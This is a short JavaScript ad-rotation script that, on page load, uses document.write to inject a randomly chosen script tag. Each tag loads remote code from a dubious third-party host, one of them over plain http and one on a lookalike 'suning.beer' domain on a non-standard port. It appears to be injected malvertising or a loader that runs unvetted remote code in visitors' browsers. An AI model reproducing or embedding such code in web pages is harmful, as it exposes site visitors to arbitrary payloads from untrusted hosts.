var randoms = {
	ads_codes: ['<script type=\'text/javascript\' charset=\'UTF-8\' async src=\'https://mg.listc.cn/m/5512?7686419\'><'+'/script>','<script id=\'mob\' type=\'text/javascript\' charset=\'utf-8\' src=\'http://k.wudejia.com/d.php?pid=3860\'><'+'/script>','<script src="https://show.suning.beer:12443/ty/CFEEF26B-A132-1889-33-40C6973A08D5.alpha"><'+'/script>'],
	ads_weight: [10,10,10],

	get_random: function(weight) {
		var s = eval(weight.join('+'));
		var r = Math.floor(Math.random() * s);
		var w = 0;
		var n = weight.length - 1;
		for(var k in weight){w+=weight[k];if(w>=r){n=k;break;}};
		return n;
	},
	init: function() {

		var rand = randoms.get_random(randoms.ads_weight);
		document.write(randoms.ads_codes[rand]);

	}
}
randoms.init();